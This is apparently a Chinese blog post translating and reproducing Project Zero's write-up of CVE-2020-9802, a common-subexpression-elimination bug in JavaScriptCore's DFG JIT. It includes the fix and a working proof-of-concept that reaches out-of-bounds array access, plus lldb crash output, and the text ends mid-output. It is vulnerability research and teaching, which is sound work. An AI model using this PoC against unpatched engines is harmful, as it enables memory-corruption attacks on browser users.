<!DOCTYPE html>
<html lang="zh">

<head>
    <meta charset="UTF-8">
<meta name="viewport"
      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
<meta http-equiv="X-UA-Compatible" content="ie=edge">

    <meta name="author" content="Lobo Q1ng">


    <meta name="subtitle" content="天空是为蓝色~">




<title>CVE-2020-9802 JSC编译优化漏洞复现 | Lobo Q1ng&#39;s Blog</title>



    <link rel="icon" href="/favicon.ico">




    <!-- stylesheets list from _config.yml -->
    
    <link rel="stylesheet" href="/css/style.css">
    



    <!-- scripts list from _config.yml -->
    
    <script src="/js/script.js"></script>
    
    <script src="/js/tocbot.min.js"></script>
    



    
    
        
    


<meta name="generator" content="Hexo 7.3.0"></head>

<body>
    <script>
        // this function is used to check current theme before page loaded.
        (() => {
            const currentTheme = window.localStorage && window.localStorage.getItem('theme') || '';
            const isDark = currentTheme === 'dark';
            const pagebody = document.getElementsByTagName('body')[0]
            if (isDark) {
                pagebody.classList.add('dark-theme');
                // mobile
                document.getElementById("mobile-toggle-theme").innerText = "· Dark"
            } else {
                pagebody.classList.remove('dark-theme');
                // mobile
                document.getElementById("mobile-toggle-theme").innerText = "· Light"
            }
        })();
    </script>

    <div class="wrapper">
        <header>
    <nav class="navbar">
        <div class="container">
            <div class="navbar-header header-logo"><a href="/">Q1ng&#39;s Blog</a></div>
            <div class="menu navbar-right">
                
                    <a class="menu-item" href="/archives">Posts</a>
                
                    <a class="menu-item" href="/category">Categories</a>
                
                    <a class="menu-item" href="/tag">Tags</a>
                
                    <a class="menu-item" href="/about">About</a>
                
                <input id="switch_default" type="checkbox" class="switch_default">
                <label for="switch_default" class="toggleBtn"></label>
            </div>
        </div>
    </nav>

    
    <nav class="navbar-mobile" id="nav-mobile">
        <div class="container">
            <div class="navbar-header">
                <div>
                    <a href="/">Q1ng&#39;s Blog</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
                </div>
                <div class="menu-toggle" onclick="mobileBtn()">&#9776; Menu</div>
            </div>
            <div class="menu" id="mobile-menu">
                
                    <a class="menu-item" href="/archives">Posts</a>
                
                    <a class="menu-item" href="/category">Categories</a>
                
                    <a class="menu-item" href="/tag">Tags</a>
                
                    <a class="menu-item" href="/about">About</a>
                
            </div>
        </div>
    </nav>

</header>
<script>
    var mobileBtn = function f() {
        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
        var mobileMenu = document.getElementById("mobile-menu");
        if(toggleMenu.classList.contains("active")){
           toggleMenu.classList.remove("active")
            mobileMenu.classList.remove("active")
        }else{
            toggleMenu.classList.add("active")
            mobileMenu.classList.add("active")
        }
    }
</script>
            <div class="main">
                <div class="container">
    
    
        <div class="post-toc">
    <div class="tocbot-list">
    </div>
    <div class="tocbot-list-menu">
        <a class="tocbot-toc-expand" onclick="expand_toc()">Expand all</a>
        <a onclick="go_top()">Back to top</a>
        <a onclick="go_bottom()">Go to bottom</a>
    </div>
</div>

<script>
    var tocbot_timer;
    var DEPTH_MAX = 6; // 为 6 时展开所有
    var tocbot_default_config = {
        tocSelector: '.tocbot-list',
        contentSelector: '.post-content',
        headingSelector: 'h1, h2, h3, h4, h5',
        orderedList: false,
        scrollSmooth: true,
        onClick: extend_click,
    };

    function extend_click() {
        clearTimeout(tocbot_timer);
        tocbot_timer = setTimeout(function() {
            tocbot.refresh(obj_merge(tocbot_default_config, {
                hasInnerContainers: true
            }));
        }, 420); // 这个值是由 tocbot 源码里定义的 scrollSmoothDuration 得来的
    }

    document.ready(function() {
        tocbot.init(obj_merge(tocbot_default_config, {
            collapseDepth: 1
        }));
    });

    function expand_toc() {
        var b = document.querySelector('.tocbot-toc-expand');
        var expanded = b.getAttribute('data-expanded');
        expanded ? b.removeAttribute('data-expanded') : b.setAttribute('data-expanded', true);
        tocbot.refresh(obj_merge(tocbot_default_config, {
            collapseDepth: expanded ? 1 : DEPTH_MAX
        }));
        b.innerText = expanded ? 'Expand all' : 'Collapse all';
    }

    function go_top() {
        window.scrollTo(0, 0);
    }

    function go_bottom() {
        window.scrollTo(0, document.body.scrollHeight);
    }

    function obj_merge(target, source) {
        for (var item in source) {
            if (source.hasOwnProperty(item)) {
                target[item] = source[item];
            }
        }
        return target;
    }
</script>
    

    
    <article class="post-wrap">
        <header class="post-header">
            <h1 class="post-title">CVE-2020-9802 JSC编译优化漏洞复现</h1>
            
                <div class="post-meta">
                    
                        Author: <a itemprop="author" rel="author" href="/">Lobo Q1ng</a>
                    

                    
                        <span class="post-time">
                        Date: <a href="#">March 12, 2025&nbsp;&nbsp;22:36:15</a>
                        </span>
                    
                    
                        <span class="post-category">
                    Category:
                            
                                <a href="/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">漏洞复现</a>
                            
                        </span>
                    
                </div>
            
        </header>

        <div class="post-content">
            <h1 id="CVE-2020-9802-复现"><a href="#CVE-2020-9802-复现" class="headerlink" title="CVE-2020-9802 复现"></a>CVE-2020-9802 复现</h1><p>翻译自Project Zero的博客：<a target="_blank" rel="noopener" href="https://googleprojectzero.blogspot.com/2020/09/jitsploitation-one.html">JITSpoitation</a></p>
<h2 id="JITSpoitation-I-一个JIT漏洞"><a href="#JITSpoitation-I-一个JIT漏洞" class="headerlink" title="JITSpoitation I : 一个JIT漏洞"></a>JITSpoitation I : 一个JIT漏洞</h2><p>被利用的漏洞<code>CVE-2020-9802</code>已经在IOS 13.5中修复，而两个缓解绕过漏洞<code>CVE-2020-9870</code>和<code>CVE-2020-9910</code>已经在IOS 13.6中修复。</p>
<h3 id="JIT编译器介绍"><a href="#JIT编译器介绍" class="headerlink" title="JIT编译器介绍"></a>JIT编译器介绍</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">foo</span>(<span class="params">o, y</span>)&#123;</span><br><span class="line">	<span class="keyword">let</span> x = o.<span class="property">x</span>;</span><br><span class="line">	<span class="keyword">return</span> x + y;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">10000</span>; i++)&#123;</span><br><span class="line">	<span class="title function_">foo</span>(&#123;<span class="attr">x</span>:i&#125;, <span class="number">42</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>由于JIT编译成本高昂，因此它只会针对于重复执行的代码而编译。因此，函数foo将在解释器（或者 “基线”JIT）内执行一段时间。在此期间，将收集值配置文件，对于foo来说，它看起来如下所示：</p>
<ul>
<li>o: JSObject with a property .x at offset 16</li>
<li>x: Int32</li>
<li>y: Int32</li>
</ul>
<blockquote>
<p>解释说明：JavaScript对象的内存布局是由JavaScript引擎管理的，具体的实现细节可能因引擎而异，但通常会有一些共同的设计原则。偏移量0-7存储的是隐藏类指针，8-15可能是对齐或元数据等。那么从16开始的8个字节就是属性x的值。</p>
</blockquote>
<p>之后，当优化JIT编译器最终启动时，它首先将JavaScript源代码（或更可能是解释器字节码）翻译成JIT编译器自己的中间代码表示。在DFG（JavaScriptCore的优化JIT编译器）中，此操作由<code>DFGByteCodeParser</code>完成。</p>
<p>那么，经过DFG后的foo函数中间代码表示最初看起来像这样：</p>
<figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">v0 = GetById o, .x</span><br><span class="line">v1 = ValueAdd v0, y<span class="built_in"></span></span><br><span class="line"><span class="built_in">return </span>v1</span><br></pre></td></tr></table></figure>

<p>这里，<code>GetById</code>和<code>ValueAdd</code>是相当通用（高级）的操作，能够处理不同的输入类型（例如，<code>ValueAdd</code>也能够用来连接字符串）。</p>
<p>接下来，JIT编译器检查值配置文件，并根据这些配置文件<strong>推测</strong>将来会使用类似的输入类型。在这里，它会推测 o 始终是某种<code>JSObject</code>，而<code>x</code>和<code>y</code>则是<code>Int32</code>。但是，由于无法保证推测始终正确，因此编译器**<em>必须保护推测</em>**，通常使用廉价的运行时类型检查：</p>
<figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">CheckType o, “Object with property .x <span class="built_in">at</span> offset <span class="number">16</span>”</span><br><span class="line">CheckType y, Int32</span><br><span class="line"><span class="built_in">v0</span> = GetByOffset o, <span class="number">16</span></span><br><span class="line">CheckType <span class="built_in">v0</span>, Int32</span><br><span class="line"><span class="built_in">v1</span> = ArithAdd <span class="built_in">v0</span>, y</span><br><span class="line">Return <span class="built_in">v1</span></span><br></pre></td></tr></table></figure>

<p>还请注意，<strong>GetById和ValueAdd已专门用于更高效（且不太通用）的GetByOffset和ArithAdd操作</strong>。在DFG中，这种<strong>推测性优化</strong>发生在多个地方。此时，IR代码基本上已输入，因此推测保护允许类型推断。接下来，执行大量代码优化，例如循环不变代码移动或常量折叠。DFG所做的优化概述可从<a target="_blank" rel="noopener" href="https://github.com/WebKit/WebKit/blob/main/Source/JavaScriptCore/dfg/DFGPlan.cpp">DFGPlan</a>中提取。</p>
<p>最后，现已优化的IR被降级为机器码。在DFG中，此操作由<code>DFGSpeculativeJIT</code>直接完成，而在FTL模式下，DFG IR首先被降级为另一个IR B3，该IR经过进一步优化后再降级为机器代码。</p>
<h3 id="公共子表达式消除（CSE）"><a href="#公共子表达式消除（CSE）" class="headerlink" title="公共子表达式消除（CSE）"></a>公共子表达式消除（CSE）</h3><p>这个优化背后的想法是检测重复的计算（或表达式）并将它们合并为单个计算。例如，请考虑以下JavaScript代码：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> c = <span class="title class_">Math</span>.<span class="title function_">sqrt</span>(a*a + a*a);</span><br></pre></td></tr></table></figure>

<p>进一步假设<code>a</code>和<code>b</code>是已知原始值（例如数字），则JavaScript JIT编译器可以将代码转换为以下内容：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> tmp = a*a;</span><br><span class="line"><span class="keyword">let</span> c = <span class="title class_">Math</span>.<span class="title function_">sqrt</span>(tmp + tmp);</span><br></pre></td></tr></table></figure>

<p>这样做，可以节省一次<code>ArithMul</code>操作。这种优化称为<strong>公共子表达式消除（CSE）</strong>。</p>
<p>现在，改用以下JavaScript代码：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> c = o.<span class="property">a</span>;</span><br><span class="line"><span class="title function_">f</span>();</span><br><span class="line"><span class="keyword">let</span> d = o.<span class="property">a</span>;</span><br></pre></td></tr></table></figure>

<p>而这种情况下，编译器无法消除CSE期间的第二个属性加载操作，因为中间的函数调用可能会改变<code>.a</code>属性的值。</p>
<p>在JSC中，某个操作是否可以受CSE约束（以及在什么情况下）的建模是在<code>DFGClobberize</code>中完成的。对于<code>ArithMul</code>，<code>DFGClobberize</code>指出：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> ArithMul:</span><br><span class="line"><span class="keyword">switch</span> (node-&gt;binaryUseKind()) &#123;</span><br><span class="line">    <span class="keyword">case</span> Int32Use:</span><br><span class="line">    <span class="keyword">case</span> Int52RepUse:</span><br><span class="line">    <span class="keyword">case</span> DoubleRepUse:</span><br><span class="line">        def(PureValue(node, node-&gt;arithMode()));</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    <span class="keyword">case</span> UntypedUse:</span><br><span class="line">        clobberTop();</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">        DFG_CRASH(graph, node, <span class="string">&quot;Bad use kind&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>此处<code>PureValue</code>的<code>def()</code>表示计算不依赖于任何上下文，因此当给定相同的输入时，它将始终产生相同的结果。但是，请注意，<code>PureValue</code>由操作<code>ArithMode</code>参数化，<strong>该参数指定操作是否应处理（例如，通过转交给解释器）整数溢出</strong>。在这种情况下，参数化可以防止两个具有不同整数溢出处理方式的<code>ArithMul</code>操作相互替换。处理溢出的操作通常也称为“已检查”操作，“未检查”操作是不检测或不处理溢出的操作。</p>
<p>相比之下，对于<code>GetByOffset</code>（可用于属性加载），<code>DFGClobberize</code>包含：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> GetByOffset:</span><br><span class="line">	<span class="type">unsigned</span> identifierNumber = node-&gt;storageAccessData().identifierNumber;</span><br><span class="line">	AbstractHeap <span class="title function_">heap</span><span class="params">(NamedProperties, identifierNumber)</span>;</span><br><span class="line">	read(heap);</span><br><span class="line">def(HeapLocation(NamedPropertyLoc, heap, node-&gt;child2()), LazyNode(node));</span><br></pre></td></tr></table></figure>

<p>这实质上表明此操作生成的值取决于<code>NamedProperty</code>“<a target="_blank" rel="noopener" href="https://github.com/WebKit/webkit/blob/main/Source/JavaScriptCore/dfg/DFGAbstractHeap.h">抽象堆</a>“。因此，只有在两次<code>GetByOffset</code>操作之间没有对<code>NamedProperties</code>抽象堆（<strong>即包含属性值的内存位置</strong>）进行写入的情况下，消除第二次<code>GetByOffset</code>才是合理的。</p>
<h3 id="The-BUG"><a href="#The-BUG" class="headerlink" title="The BUG"></a>The BUG</h3><p><strong>DFGClobberize</strong> 没有考虑<strong>ArithNegate</strong>操作的<code>ArithMode</code>：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> <span class="title class_">ArithNegate</span>:</span><br><span class="line">	<span class="keyword">if</span> (node-&gt;<span class="title function_">child1</span>().<span class="title function_">useKind</span>() == <span class="title class_">Int32Use</span> || ...)</span><br><span class="line">    	<span class="title function_">def</span>(<span class="title class_">PureValue</span>(node));          <span class="comment">// &lt;- only the input matters, not the ArithMode</span></span><br></pre></td></tr></table></figure>

<p>这可能导致CSE用未检查的<code>ArithNegate</code>替代已检查的<code>ArithNegate</code>。对于<code>ArithNegate</code>（32位整数的取反），整数溢出仅在一种特定情况下发生：当对<code>INT_MIN: -2147483648 </code>取反时。这是因为<code>2147483648</code>不能表示32位有符号整数，因此<code>-INT_MIN</code>会导致整数溢出，最后的值依然为<code>INT_MIN</code>，即对<code>INT_MIN</code>取反依然得到<code>INT_MIN</code>。 </p>
<blockquote>
<p><strong>这个错误是通过研究<code>DFGClobberize</code>中的CSE def发现的，思考为什么某些<code>PureValues</code>（以及哪些）需要用ArithMode进行参数化，然后搜索缺少该参数化的情况</strong>。</p>
</blockquote>
<p>修复这个漏洞的方法非常简单：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">-            def(PureValue(node));</span><br><span class="line">+            def(PureValue(node, node-&gt;arithMode()));</span><br></pre></td></tr></table></figure>

<p>现在教会CSE考虑<code>ArithNegate</code>操作的arithMode。因此，两个具有不同模式的<code>ArithNegate</code>操作不能再相互替代。</p>
<p>除了<code>ArithNegate</code>之外，<code>DFGClobberize</code>还错过了<code>ArithAbs</code>操作的<code>ArithMode</code>。</p>
<p>请注意，这种类型的错误可能很难通过模糊测试检测到，因为：</p>
<ul>
<li>fuzzer需要在相同的输入上创建两个<code>ArithNegate</code>操作，但使用不同的<code>ArithMode</code></li>
<li>fuzzer需要触发<code>ArithMode</code>差异有影响的情况，在本例中，这意味着需要对<code>INT_MIN</code>取反。除非引擎有自定义的”sanitizers”（清理器）来尽早检测此类问题，并且除非进行差分模糊测试，否则fuzzer还需要以某种方式将这种情况转化为内存安全违规或断言失败。正如下一节所示，这一步可能是最困难的，并且极不可能偶然发生的。</li>
</ul>
<h3 id="实现越界访问"><a href="#实现越界访问" class="headerlink" title="实现越界访问"></a>实现越界访问</h3><p>下面的JavaScript函数通过此漏洞实现了对JSArray的任意索引（在本例中为7）的越界访问：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">hax</span>(<span class="params">arr, n</span>) &#123;</span><br><span class="line">    n |= <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> (n &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">let</span> v = (-n)|<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">let</span> i = <span class="title class_">Math</span>.<span class="title function_">abs</span>(n);</span><br><span class="line">        <span class="keyword">if</span> (i &lt; arr.<span class="property">length</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (i &amp; <span class="number">0x80000000</span>) &#123;</span><br><span class="line">                i += -<span class="number">0x7ffffff9</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (i &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                arr[i] = <span class="number">1.04380972981885e-310</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>下面逐步解释如何构建此POC。本节末尾附上该函数的注释版本。</p>
<p>首先，<code>ArithNegate</code>仅用于对整数求反（更通用的ValueNegate操作可以对所有JavaScript值求反），但**在_JavaScript规范_中，数字通常是浮点值。**因此，有必要“提示”编译器输入值始终是整数。这很容易实现，只需首先执行按位运算即可，这将始终产生32位有符号整数值：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">n = n|<span class="number">0</span>		<span class="comment">// n will be an integer value now</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>在JavaScript中，数字默认是<strong>64位双精度浮点数</strong>（即IEEE754标准的<code>double</code>类型）。它的整数精度有53位。为什么经过上述运算后它会变成一个32位有符号整数呢？</p>
<p>因为JavaScript中的位运算符（如<code>|</code>、<code>&amp;</code>、<code>^</code>、<code>~</code>等）在设计上是针对32位有符号整数的。这意味着：</p>
<ul>
<li>在执行位运算之前，JavaScript会先将操作数转换为32位有符号整数。</li>
<li>位运算的结果也是32位有符号整数</li>
<li>当执行<code>n | 0</code>时，JavaScript会先将n转换为32位有符号整数，然后再与0进行按位或运算。</li>
</ul>
<p>由于0的所有位都是0，按位或运算不会改变n的值，但它的副作用是强制将n转换为32位有符号整数。</p>
</blockquote>
<p>有了这些，现在就可以构造一个未经检查的<code>ArithNegate</code>操作（之后可以通过公共子表达式消除(CSE)将其替换成一个已检查的操作）：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">n = n|<span class="number">0</span>;</span><br><span class="line"><span class="keyword">let</span> v = (-n)|<span class="number">0</span>;</span><br></pre></td></tr></table></figure>

<p>这里，再DFGFixupPhase期间，n的取反将转换为未检查的ArithNeg运算。编译器可以省略溢出检查，因为取反值的唯一用途是按位或，并且对于溢出值和“正确”值的行为相同：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">js&gt; -<span class="number">2147483648</span> | <span class="number">0</span></span><br><span class="line">-<span class="number">2147483648</span></span><br><span class="line">js&gt; <span class="number">2147483648</span> | <span class="number">0</span></span><br><span class="line">-<span class="number">2147483648</span></span><br></pre></td></tr></table></figure>

<p>接下来，需要构造一个以n作为输入的已检查ArithNegate操作。获得ArithNegate的一个有趣方法是（原因稍后会变得清晰）是让编译器将ArithAbs操作强度降低为ArithNegate操作。只有当编译器可以证明n为负数时才会发生这种情况，这很容易实现，因为DFG的<code>IntegerRangeOptimization</code>过程是路径敏感的：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">n = n|<span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span> (n &lt; <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="comment">// Compiler knows that n will be a negative integer here</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">let</span> v = (-n)|<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">let</span> i = <span class="title class_">Math</span>.<span class="title function_">abs</span>(n);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在这里，在字节码解析期间，对<code>Math.abs</code>的调用将首先被降低为<code>ArithAbs</code>操作，<strong>因为编译器能够证明该调用将始终导致<code>mathAbs</code>函数的执行，因此将其替换为<code>ArithAbs</code>操作</strong>，该操作具有相同的运行时语义，但不需要在运行时进行函数调用。编译器本质上是通过这种方式内联<code>Math.abs</code>。稍后，<code>IntegerRangeOptimization</code>会将<code>ArithAbs</code>转换为经过检查的<code>ArithNegate</code>（必须检查<code>ArithNegate</code>，因为不能排除n的INT_MIN）。因此，if语句中的两个语句本质上（在伪DFG IR中）变为：</p>
<figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">v</span> <span class="operator">=</span> ArithNeg(unchecked) n</span><br><span class="line"><span class="attribute">i</span> <span class="operator">=</span> ArithNeg(checked) n</span><br></pre></td></tr></table></figure>

<p>由于漏洞的存在，CSE稍后会变成</p>
<figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">v</span> <span class="operator">=</span> ArithNeg(unchecked) n</span><br><span class="line"><span class="attribute">i</span> <span class="operator">=</span> v</span><br></pre></td></tr></table></figure>

<p>此时，如果使用INT_MIN作为n来调用编译错误的函数，则会导致i也为INT_MIN，尽管它实际上应该是一个正数。</p>
<p>这本身是一个正确性问题，还不是安全问题。将此错误转变为安全问题的一种（也可能是唯一一种）方法是滥用安全研究人员中已经流行的JIT优化：<strong>边界检查消除（bounds-check elimination）</strong>。</p>
<p>回到<code>IntegerRangeOptimization</code>过程，i的值已被标记为正数。但是，要消除边界检查，还必须知道该值小于被索引数组的长度。这很容易实现：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">hax</span>(<span class="params">arr, n</span>) &#123;</span><br><span class="line">  n = n|<span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> (n &lt; <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="keyword">let</span> v = (-n)|<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">let</span> i = <span class="title class_">Math</span>.<span class="title function_">abs</span>(n);</span><br><span class="line">    <span class="keyword">if</span> (i &lt; arr.<span class="property">length</span>) &#123;</span><br><span class="line">        arr[i];</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>现在触发错误时，i将为INT_MIN，因此将通过比较并执行数组访问。但是，边界检查将被删除，因为<code>IntegerRangeOptimization</code>错误地（虽然从技术上讲不是它的错）确定i始终在边界内。</p>
<p>在触发该错误之前，必须对JavaScript代码进行JIT编译。这通常只需通过多次执行代码即可实现。但是，如果推测访问在范围内，则对arr的索引访问将仅被降低（通过SSALoweringPhase）到<code>CheckInBounds</code>和未进行边界检查的GetByVal。如果在基线JIT中解释或执行期间经常观察到访问越界，则情况并非如此。因此，在“训练”函数期间，有必要使用合理的边界索引：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">1</span>; i &lt;= <span class="variable constant_">ITERATIONS</span>; i++) &#123;</span><br><span class="line">    <span class="keyword">let</span> n = -<span class="number">4</span>;</span><br><span class="line">    <span class="keyword">if</span> (i == <span class="variable constant_">ITERATIONS</span>) &#123;</span><br><span class="line">        n = -<span class="number">2147483648</span>;        <span class="comment">// INT_MIN</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_">hax</span>(arr, n);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在JSC中运行此代码将会崩溃：</p>
<blockquote>
<p>代码我做了一点点改进，因为我发现不加print的话，就会失效。我认为很有可能不加print的话，编译器认为没有访问内存，因此就不会尝试去访问，所以就不会出现Crash。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">hax</span>(<span class="params">arr, n</span>) &#123;</span><br><span class="line"> n = n|<span class="number">0</span>;</span><br><span class="line"> <span class="keyword">if</span> (n &lt; <span class="number">0</span>) &#123;</span><br><span class="line">   <span class="keyword">let</span> v = (-n)|<span class="number">0</span>;</span><br><span class="line">   <span class="keyword">let</span> i = <span class="title class_">Math</span>.<span class="title function_">abs</span>(n);</span><br><span class="line">   <span class="keyword">if</span> (i &lt; arr.<span class="property">length</span>) &#123;</span><br><span class="line">     <span class="title function_">print</span>(arr[i]);</span><br><span class="line">   &#125;</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> arr = [<span class="number">13.37</span>, <span class="number">2.2</span>, <span class="number">3.3</span>]</span><br><span class="line"><span class="keyword">const</span> <span class="variable constant_">ITERATIONS</span> = <span class="number">0xc0000</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">let</span> i = <span class="number">1</span>; i &lt;= <span class="variable constant_">ITERATIONS</span>; i++)&#123;</span><br><span class="line"> <span class="keyword">let</span> n = -<span class="number">2</span>;</span><br><span class="line"> <span class="keyword">if</span>(i == <span class="variable constant_">ITERATIONS</span>)&#123;</span><br><span class="line">     n = -<span class="number">2147483648</span>;            <span class="comment">// INT_MIN</span></span><br><span class="line"> &#125;</span><br><span class="line"> <span class="title function_">hax</span>(arr, n);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>最后执行即可<code>lldb ./jsc ./test.js</code>然后<code>run</code>即可。出现crash如下所示：</p>
<img src="/2025/03/12/CVE-2020-9802-JSC%E7%BC%96%E8%AF%91%E4%BC%98%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20250312213621314.png" class="" title="image-20250312213621314"></blockquote>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">lldb -- /System/Library/Frameworks/JavaScriptCore<span class="number">.</span>framework/Resources/jsc poc<span class="number">.</span><span class="keyword">js</span></span><br><span class="line">   (lldb) r</span><br><span class="line">   Process <span class="number">12237</span> stopped</span><br><span class="line">   * thread #<span class="number">1</span>, queue = <span class="string">&#x27;com.apple.main-thread&#x27;</span>, stop reason = EXC_BAD_ACCESS (code=<span class="number">1</span>, address=<span class="number">0x1c1fc61348</span>)</span><br><span class="line">       frame #<span class="number">0</span>: <span class="number">0x000051fcfaa06f2e</span></span><br><span class="line">   -&gt;  <span class="number">0x51fcfaa06f2e</span>: <span class="keyword">movsd</span>  <span class="built_in">xmm0</span>, <span class="built_in">qword</span> <span class="built_in">ptr</span> [<span class="built_in">rax</span> + <span class="number">8</span>*<span class="built_in">rcx</span>] <span class="comment">; xmm0 = mem[0],zero</span></span><br><span class="line">   Target <span class="number">0</span>: 